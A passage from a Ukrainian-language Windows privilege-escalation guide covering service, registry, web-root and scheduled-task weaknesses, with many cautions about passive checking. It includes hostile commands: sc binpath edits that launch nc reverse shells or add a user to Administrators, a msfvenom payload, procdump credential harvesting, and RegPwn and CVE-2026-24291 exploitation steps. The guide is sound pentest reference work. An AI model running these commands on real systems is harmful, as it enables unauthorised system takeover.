Перегляньте наступну сторінку, щоб **дізнатися про цікаві токени** та про те, як зловживати ними:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Користувачі, що ввійшли в систему / Сеанси

```bash
qwinsta
klist sessions
```

### Домашні папки

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Політика паролів

```bash
net accounts
```

### Отримання вмісту буфера обміну

```bash
powershell -command "Get-Clipboard"
```

## Запущені процеси

### Дозволи на файли та папки

Насамперед, переглядаючи список процесів, **перевірте, чи є паролі в командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати якийсь запущений бінарний файл** або чи маєте права на запис до папки з бінарними файлами, щоб скористатися можливими [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md): їх можна використати для підвищення привілеїв.

Слухач debugger може працювати недовго, тому його відсутність у знімку портів, отриманому пасивним способом, не доводить, що він ніколи не був доступний. Якщо виявили слухач, перевірте його PID, власника процесу та можливість доступу до нього з боку користувача з нижчими привілеями. Сама лише назва програми або прапорець debug не підтверджує можливість виконання коду між користувачами. Під час звичайного переліку залишайтеся в пасивному режимі та не надсилайте команди debugger.

**Перевірка дозволів на бінарні файли процесів**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Перевірка дозволів папок із бінарними файлами процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Каталоги динамічних препроцесорів Snort

Snort 2 може завантажувати shared libraries із `dynamicpreprocessor directory`, зазначеного в конфігурації, вибраній за допомогою `snort.exe -c <config>`. Якщо заплановане завдання або служба запускає Snort від імені іншого облікового запису, перевірте саме цю конфігурацію та ACL оголошеного каталогу модулів. Якщо ваш токен дає змогу створювати там файли, цей шлях варто перевірити на можливість виконання коду під час наступного завантаження модулів цим завданням або службою. Перевірте ефективні привілеї облікового запису запуску, активну конфігурацію, сумісність модулів і будь-які обмеження заборони чи спільного доступу; сама лише можливість запису в каталог не доводить наявність шляху до підвищення привілеїв. У [документації Snort щодо dynamic-preprocessor](https://www.snort.org/documents/dpx-readme) описано завантаження модулів під час виконання.

### Привілейована вебслужба з кореневим каталогом документів, доступним для запису

В інсталяції Apache на Windows порівняйте шлях до виконуваного файла служби й обліковий запис, від імені якого вона запускається, зі значенням `DocumentRoot` в активному `httpd.conf`. Для типового розташування XAMPP перевірте `C:\xampp\apache\conf\httpd.conf` і ACL налаштованого кореневого каталогу документів, часто це `C:\xampp\htdocs`. Якщо користувач із нижчими привілеями може створювати файли в цьому каталозі, а Apache працює від імені `LocalSystem`, виконання коду на боці сервера може перетнути межу привілеїв хоста. Переконайтеся, що служба запущена, обслуговує саме цей шлях і обробник на боці сервера обробляє цей тип файлів; сам факт можливості запису в кореневий каталог доводить лише можливість створення файлів. Перевірте ACL, не записуючи пробний файл:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Для стандартного встановлення WAMP служба може вказувати на версійну `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (або `C:\wamp\...` для 32-бітної конфігурації), а конфігурація міститися поруч у `conf\httpd.conf`, із кореневим каталогом за замовчуванням `C:\wamp64\www` або `C:\wamp\www`. Перевірте точний образ служби, обліковий запис, від імені якого вона запускається, ефективне значення `DocumentRoot` (зокрема розгортання `${INSTALL_DIR}` та перевизначення віртуальних хостів) і ACL кореневого каталогу. Наявність доступу на запис до каталогу WAMP сама по собі не доводить, що Apache працює як `SYSTEM` або виконує надісланий файл. [В документації Apache описано, як служба Windows вибирає конфігурацію](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Доступний для запису кореневий каталог IIS та мережева ідентичність пулу застосунків

Для IIS зіставте фізичний каталог, доступний для запису, з **активним сайтом/застосунком** у `applicationHost.config`, а потім визначте налаштований для нього пул і серверний handler. Код у каталозі, який обслуговується, виконується від імені пулу лише тоді, коли IIS обробляє цей тип файлів і маршрут доступний. Перш ніж вважати доступний для запису каталог засобом виконання коду, перевірте ефективні права поточного користувача на створення файлів, стан сайту під час виконання, handler і перевизначення для відповідного шляху.

Динамічна компіляція ASP.NET потребує окремої перевірки: згенеровані файли в каталозі компіляції застосунку. За замовчуванням це каталог `Temporary ASP.NET Files` у відповідному каталозі встановлення .NET Framework, але його можна змінити параметром застосунку `<compilation tempDirectory>`. [Microsoft описує розташування та підкаталоги для кожного застосунку](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) і [рекомендує ізолювати каталоги компіляції, якщо пули застосунків не довіряють один одному](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Якщо токен із нижчими привілеями дає змогу змінити згенерований вихідний код у кеші **конкретного** застосунку, з’ясуйте, чи перекомпілює цей застосунок його від імені більш привілейованої [ідентичності робочого процесу](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Самі по собі ACL файлу або каталогу не доводять можливості виконання коду: зіставте кеш з активним застосунком, ефективним токеном і ACL, параметрами компіляції, ідентичністю процесу та часом можливої повторної компіляції. Переглядайте метадані лише для читання; під час переліку не запускайте компіляцію й не змінюйте файли кешу.

Пул IIS, налаштований як `ApplicationPoolIdentity` або `NetworkService`, зазвичай автентифікується до доменних ресурсів як **обліковий запис комп’ютера-хоста**, хоча його локальний токен може мати низькі привілеї. `LocalSystem` уже має високі локальні привілеї й також використовує обліковий запис комп’ютера в мережі; `LocalService` зазвичай використовує анонімні мережеві облікові дані. Пул `SpecificUser` використовує налаштований для нього обліковий запис. [Microsoft описує ці типи ідентичностей](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) і [мережеву ідентичність пулу застосунків](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Якщо параметр ідентичності не задано, можуть застосовуватися значення за замовчуванням для пулу, які відрізняються між поколіннями IIS, тому з’ясуйте ефективну конфігурацію, а не робіть припущення за назвою пулу. Якщо виконання коду відбувається в пулі з мережевою ідентичністю комп’ютера, оцініть права доступу до каталогу **саме цього комп’ютера**. [DCSync](../active-directory-methodology/dcsync.md) потребує прав реплікації в контексті іменування домену; наявність квитка облікового запису комп’ютера або його ролі на хості сама по собі цього не доводить. Під час пасивного переліку перевіряйте конфігурацію й ACL, не завантажуючи файлів, не ініціюючи мережеву автентифікацію та не запитуючи квитків.

Для доступного для читання обробника ASP.NET, який запускає допоміжний процес, простежте шлях будь-якого значення, отриманого із запиту, через автентифікацію, розшифрування, перевірку та формування команди. Обробник, який додає декодований токен до `ProcessStartInfo("cmd", "/c ...")`, може дозволити метасимволам оболонки змінити команду; [Microsoft описує спеціальні символи `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Переконайтеся, що недовірений користувач справді може впливати на декодоване значення й звертатися до обробника, а потім з’ясуйте ефективну ідентичність пулу застосунків або імперсонованого користувача та ідентичність дочірнього процесу. Самі по собі доступний для читання рядок вихідного коду, слухач на localhost або слабкість формату токена не доводять можливості виконання привілейованої команди. Переглядайте вихідний код і конфігурацію пулу, не надсилаючи підроблених запитів і не запускаючи допоміжний процес під час пасивного переліку.

Для PHP-служби у Windows шлях, контрольований запитом і переданий у [`include` або `require`](https://www.php.net/manual/en/function.include.php), може призвести до виконання PHP-файлу, доступного для запису користувачеві з нижчими привілеями, від імені робочого процесу. Переконайтеся, що запит може досягти цього оператора, визначений шлях вказує на файл, який користувач із нижчими привілеями може змінити, а робочий процес — прочитати, що обмеження шляхів PHP дозволяють включення і що робочий процес справді має вищі привілеї. Самі по собі слухач на loopback-інтерфейсі або файл, доступний для запису, не доводять наявності цього ланцюжка; під час пасивного переліку перевірте вихідний код, ідентичність служби й ACL файлів, не викликаючи кінцеву точку.

### Пошук паролів у пам’яті

За допомогою **procdump** із sysinternals можна створити дамп пам’яті запущеного процесу. У служб на кшталт FTP **облікові дані зберігаються в пам’яті у відкритому вигляді** — спробуйте створити дамп пам’яті й прочитати облікові дані.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Небезпечні GUI-застосунки

**Застосунки, що працюють від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: «Довідка та підтримка Windows» (Windows + F1): знайдіть «командний рядок» і натисніть «Натисніть, щоб відкрити командний рядок».

### Імпорт файлів проєктів із підвищеними привілеями

Застосунок, який автоматично відкриває проєкти з доступного для запису користувачам із нижчими привілеями каталогу, перетинає межу довіри до вхідних даних під обліковим записом імпортера. Перевірте **точний шлях із правами на запис**, процес або завдання, яке його відкриває, ефективну ідентичність і версію парсера. [Історична проблема Ghidra з відкриттям/відновленням проєкту](https://github.com/NationalSecurityAgency/ghidra/issues/71) дозволяла використовувати зовнішні сутності XML у метаданих проєкту; мережева сутність у Windows могла спричинити автентифікацію від імені облікового запису імпортера, якщо це дозволяють [політики вихідного SMB і NTLM](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). Це підстава перевірити ризик витоку облікових даних, а не доказ негайного доступу адміністратора: отриману відповідь має бути можливо використати через окремий авторизований або вразливий шлях, а поточні збірки слід оцінювати з огляду на фактичний стан виправлень. Не відкривайте спеціально сформований проєкт під час пасивного перерахування; перевірте процес імпорту та ACL.

## Служби

Право [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) для об’єкта Service Control Manager (SCM) відрізняється від прав на наявну службу. Успішний запит на читання [`OpenSCManager`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) із цим правом — підстава для перевірки, а не доказ того, що нову службу можна запустити. [`CreateService` повертає дескриптор](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) із правами на службу, запитаними під час її створення; повторне відкриття служби згодом виконує окрему перевірку доступу й може завершитися невдачею, навіть якщо початковий дескриптор можна було використати. Окремо перевірте ефективний локальний або віддалений токен, надані права дескриптора, обліковий запис служби, політику запуску та шлях до виконуваного файла. Не створюйте й не запускайте службу під час пасивного перерахування.

Для віддаленого встановлення служби зіставте ці права SCM із спільним ресурсом на цільовій системі, до якого **той самий мережевий сеанс входу** має доступ на запис, базовими ACL NTFS і локальним шляхом до виконуваного файла, який може запускати обліковий запис служби. Обліковий запис без прав адміністратора може перетнути цю межу, якщо є незвично широкі права SCM і доступний шлях для розміщення файла; адміністративний спільний ресурс не є обов’язковою умовою. Сам по собі доступ на запис до спільного ресурсу або окремо виявлене право створення служби в SCM не доводять, що нову службу можна запустити з вищими привілеями.

Наявна служба може запускати допоміжний виконуваний файл під час запуску, зупинки або іншої події життєвого циклу, навіть якщо цього файла немає в її `ImagePath`. Якщо ім’я допоміжного файла шукається в каталозі, доступному для запису користувачам із нижчими привілеями, а служба працює з вищими привілеями, відсутній файл може бути потенційним кандидатом для підміни за певних умов. Підтвердьте **фактичний код служби або задокументований виклик допоміжного файла**, визначений шлях до виконуваного файла та порядок пошуку, права на створення файлів у каталозі, ідентичність служби й наявність доступного тригера життєвого циклу. Самі по собі доступний для запису каталог служби або відсутній файл не доводять, що служба завантажить цей файл; під час пасивної перевірки не зупиняйте й не запускайте службу.

Для наявної служби [`SERVICE_START` дозволяє передавати аргументи в `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); це право відрізняється від [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Перш ніж вважати право запуску чимось більшим за право керування, перевірте код служби або задокументований інтерфейс. Якщо служба використовує вибраний користувачем аргумент як шлях для журналу або експорту, перевірте ідентичність служби, точний зв’язок між аргументом і записом файла, обмеження шляхів і права на **створений файл**. Запис у захищений каталог може сприяти підвищенню привілеїв лише за наявності окремого привілейованого процесу, який використовує або завантажує цей файл; сам по собі доступний для запису журнал або право запуску недостатні. Під час пасивної інвентаризації не запускайте службу й не створюйте тестовий файл.

Для агента моніторингу NSClient++ доступний для читання `nsclient.ini` — це **підстава перевірити конфігурацію**: там можуть зберігатися облікові дані для вебінтерфейсу, а `boot.ini` може перенаправляти конфігурацію в інше місце. Перевірте фактичний обліковий запис служби, політику доступу й вебслухач, а також те, чи може автентифікована роль змінювати налаштування або скрипти. Для привілейованого виконання також потрібні `CheckExternalScripts` (або інший увімкнений шлях виконання), ефективне право реєструвати чи змінювати команду та тригер, який запускає її з ідентичністю служби. Слухач, доступний лише через loopback, усе одно може бути доступний локальному користувачу, але самі по собі шлях до файла, пароль або слухач не доводять наявності цих прав. Під час пасивного перерахування перевіряйте метадані й дозволи, не показуючи секрети та не викликаючи веб API. Див. [структуру файлів NSClient++](https://nsclient.org/docs/concepts/file-layout/), [рекомендації щодо безпеки вебінтерфейсу та скриптів](https://nsclient.org/docs/setup/securing/) і [конфігурацію зовнішніх скриптів](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Для служби, у якої `ImagePath` має значення `nssm.exe`, перевірте фактичний обліковий запис запуску служби та значення `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM зберігає дочірній застосунок саме там](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), а `AppDirectory` задає налаштований робочий каталог. Перш ніж вважати дозволи обгортки повним описом межі безпеки служби, перевірте дочірній виконуваний файл і ACL його батьківського каталогу. Локальна кінцева точка WCF або SOAP, відкрита цим дочірнім процесом, є окремою підставою для перевірки: підтвердьте, що кінцева точка доступна користувачу з нижчими привілеями, конкретна операція приймає його вхідні дані, а дочірній процес служби виконує небезпечну операцію з вищими привілеями. Самі по собі обліковий запис служби, URL кінцевої точки або доступний для запису шлях не доводять можливості підвищення привілеїв; під час пасивного перерахування не викликайте операції служби.

Для власної операції WCF простежте, чи потрапляє контрольований викликачем рядок у будь-який runspace PowerShell. [`Pipeline.Commands.AddScript` додає текст скрипту](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), а [`Pipeline.Invoke` виконує конвеєр](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` з обліковими даними транспортного рівня Windows](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) автентифікує клієнта, але дозвіл викликати **саме цю** операцію та ефективну ідентичність runspace потрібно перевіряти окремо. Шлях від вхідних даних викликувача з нижчими привілеями до `AddScript`, що виконується з ідентичністю служби з вищими привілеями, є межею виконання коду; самі по собі відкритий порт, автентифікований клієнт або невикористовуваний метод у сторонній збірці нічого не доводять. Під час перерахування статично перевірте розгорнуту службу, контракт, авторизацію та налаштування імперсонації, не викликаючи кінцеву точку.

Service Triggers дають змогу Windows запускати службу за певних умов (активність іменованого каналу/RPC-кінцевої точки, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START часто можна запустити привілейовані служби, активувавши їхні тригери. Техніки перерахування й активації див. тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Служба збору діагностичних даних Visual Studio

Інсталяції Visual Studio з інструментами C/C++ можуть містити `VSStandardCollectorService150` — службу діагностики, налаштовану для запуску від імені `LocalSystem`. У [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) використовували junction і гонку з object-manager link, щоб перенаправити скидання DACL служби. Для продемонстрованого підвищення привілеїв також був потрібен доступний шлях відновлення MSI для Visual Studio Setup WMI Provider і цільовий файл `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Компонент виправили в січні 2024 року.

Для пасивної первинної перевірки перегляньте обліковий запис і шлях до двійкового файла цієї служби, перевірте, чи існує шлях до компілятора Setup WMI, і з’ясуйте стан виправлень установленого компонента. Самі по собі запис служби, версія продукту Visual Studio або файл компілятора не доводять, що система вразлива. Для перевірки не потрібно запускати службу чи виконувати відновлення.

Отримайте список служб:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Дозволи

Ви можете використовувати **sc**, щоб отримати інформацію про службу

```bash
sc qc <service_name>
```

Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевірити необхідний рівень привілеїв для кожної служби.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Тут можна завантажити accesschk.exe для XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо з’являється ця помилка (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Не вдалося запустити службу: її вимкнено або з нею не пов’язано жодного ввімкненого пристрою._

Її можна ввімкнути за допомогою

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Врахуйте, що для роботи служби upnphost потрібна SSDPSRV (для XP SP1)**

**Ще один обхідний спосіб** вирішити цю проблему — запустити:

```
sc.exe config usosvc start= auto
```

### **Змінення шляху до бінарного файлу служби**

Якщо група «Автентифіковані користувачі» має право **SERVICE_ALL_ACCESS** для служби, можна змінити виконуваний бінарний файл служби. Щоб змінити й виконати **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Перезапустити службу

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Привілеї можна підвищити завдяки різним дозволам:

- **SERVICE_CHANGE_CONFIG**: Дозволяє змінювати конфігурацію бінарного файлу служби.
- **WRITE_DAC**: Дозволяє змінювати дозволи, що дає змогу змінювати конфігурацію служби.
- **WRITE_OWNER**: Дозволяє отримати право власності та змінювати дозволи.
- **GENERIC_WRITE**: Успадковує можливість змінювати конфігурацію служби.
- **GENERIC_ALL**: Також успадковує можливість змінювати конфігурацію служби.

Для виявлення та експлуатації цієї вразливості можна використовувати _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба запускається від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, часто можна перехопити службу, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінити бінарний файл, який запускає служба**, або чи маєте **дозволи на запис до папки**, у якій розташований бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
За допомогою **wmic** (не в system32) можна отримати список усіх бінарних файлів, які запускають служби, а за допомогою **icacls** перевірити свої дозволи:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Також можна використовувати **sc** та **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файлу служби чи каталогу, у якому він міститься. Практичний сценарій зловживання:<sup>[[27]](#references)</sup>

1. Перевірте обліковий запис служби та шлях до виконуваного файлу за допомогою `sc qc <service_name>`.
2. Переконайтеся, що бінарний файл доступний для запису, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби корисним навантаженням або дійсним шкідливим бінарним файлом служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження чи тригера служби).

Корисні автоматизовані перевірки:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Якщо служба не дозволяє звичайному користувачеві перезапустити її, перевірте, чи запускається вона автоматично під час завантаження системи, чи має дію у разі збою, яка повторно запускає її, або чи можна опосередковано запустити її через програму, яка її використовує.

### Дозволи на змінення реєстру служб

Перевірте, чи можете ви змінювати записи реєстру служб.\
Ви можете **перевірити** свої **дозволи** на запис реєстру служби, виконавши:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Перевірте, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи на запис до ключа реєстру певної служби. Сам запис ACL не доводить наявність ефективного доступу: мають значення заборонні записи, поточний токен і успадковані дозволи. Права на ключ реєстру відрізняються від прав `SERVICE_CHANGE_CONFIG` і `SERVICE_START` для об'єкта служби. Для ескалації також потрібне придатне для використання поле конфігурації служби, можливість її запустити та більш привілейований обліковий запис служби. Дивіться [права на ключі реєстру](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) від Microsoft і [довідник прав доступу до служб](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Щоб змінити шлях до виконуваного файла:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Race із символьним посиланням у реєстрі для довільного запису значення HKLM (ATConfig)

Деякі функції спеціальних можливостей Windows створюють ключі **ATConfig** для користувача, які згодом процес **SYSTEM** копіює до ключа сеансу HKLM. **Race** символьного посилання в реєстрі може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи можливість довільного **запису значення** HKLM.<sup>[[18]](#references)</sup>

Розташування ключів (приклад: Екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список установлених функцій спеціальних можливостей.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` зберігає конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу в систему/переходів до захищеного робочого стола, і користувач може його змінювати.

Сценарій експлуатації (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке має бути записане від імені SYSTEM.
2. Запустіть копіювання до захищеного робочого стола (наприклад, викликом **LockWorkstation**), що запускає процес AT broker.
3. **Виграйте race**: установіть **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **registry link** до захищеного цільового ключа HKLM.
4. SYSTEM запише вибране зловмисником значення до перенаправленого шляху HKLM.

Отримавши можливість довільного запису значення HKLM, перейдіть до LPE, перезаписавши значення конфігурації служби:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/командний рядок)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть службу, яку може запускати звичайний користувач (наприклад, **`msiserver`**), і запустіть її після запису. **Примітка:** загальнодоступна реалізація exploit **блокує робочу станцію** під час race.

Приклади інструментів (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл на реєстр, це означає, що **ви можете створювати підрозділи реєстру в ньому**. Для служб Windows цього **достатньо, щоб виконати довільний код:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Якщо шлях до виконуваного файла не взято в лапки, Windows спробує виконати кожен варіант шляху, що закінчується перед пробілом.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Перелічіть усі шляхи служб без лапок, за винятком тих, що належать до вбудованих служб Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ви можете виявити й експлуатувати** цю вразливість за допомогою metasploit: `exploit/windows/local/trusted\_service\_path` Ви можете вручну створити бінарний файл служби за допомогою metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Дії відновлення

Windows дозволяє користувачам вказувати дії, які слід виконати в разі збою служби. Цю функцію можна налаштувати так, щоб вона запускала бінарний файл. Якщо цей файл можна замінити, може бути можливе підвищення привілеїв. Докладніше див. в [офіційній документації](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Цілі скриптів запланованих завдань

Для ввімкненого завдання, яке запускає `cmd.exe /c` із файлом `.bat` або `.cmd`, перевірте скрипт, указаний в **аргументах дії**, а також `cmd.exe`. Те саме стосується явного аргументу-файлу інтерпретатора, наприклад PowerShell `-File`. Якщо запланований batch-файл містить буквальний виклик PowerShell `-File`, перевірте також ACL указаного скрипту; для змінних, умов і зчеплення команд у shell потрібно вручну відстежити виконання. Можливість викликувача записувати до скрипту або батьківського каталогу є приводом перевірити можливість виконання від імені іншого облікового запису лише тоді, коли налаштований для завдання суб’єкт відрізняється від викликувача й завдання справді доходить до цієї дії. ACL, що дозволяє лише дописування, може мати значення для скриптів, але попередній `exit` або інша логіка керування потоком може зробити дописані рядки недосяжними. Перш ніж заявляти про підвищення привілеїв, перевірте фактичні ACL, [контекст виконання завдання](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), робочий каталог, тригер і політику керування застосунками. Під час інвентаризації не змінюйте скрипт і не запускайте завдання.

## Іменовані потоки в доступних файлах

